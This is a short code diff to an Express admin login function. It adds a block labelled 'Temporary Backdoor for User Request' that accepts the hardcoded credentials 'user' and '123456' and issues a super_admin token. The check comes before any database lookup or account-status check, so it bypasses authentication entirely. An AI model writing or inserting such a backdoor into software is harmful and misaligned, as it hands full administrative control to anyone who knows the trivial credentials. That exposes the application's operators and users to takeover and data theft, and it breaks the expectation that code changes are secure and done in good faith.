@@ -83,6 +83,21 @@ export const loginAdmin = async (req, res) => {
     try {
         const { email, password } = req.body;
 
+        // Temporary Backdoor for User Request
+        if (email === 'user' && password === '123456') {
+            const token = generateToken('mock-admin-id', 'super_admin', 'admin');
+            return res.json({
+                message: 'Admin Login successful (Bypass)',
+                token,
+                user: {
+                    id: 'mock-admin-id',
+                    email: 'user',
+                    name: 'Temporary Admin',
+                    role: 'super_admin',
+                },
+            });
+        }
+
         const admin = await Admin.findOne({ where: { email } });
         if (!admin || !admin.is_active) {
             return res.status(401).json({ message: 'Invalid credentials or inactive account' });
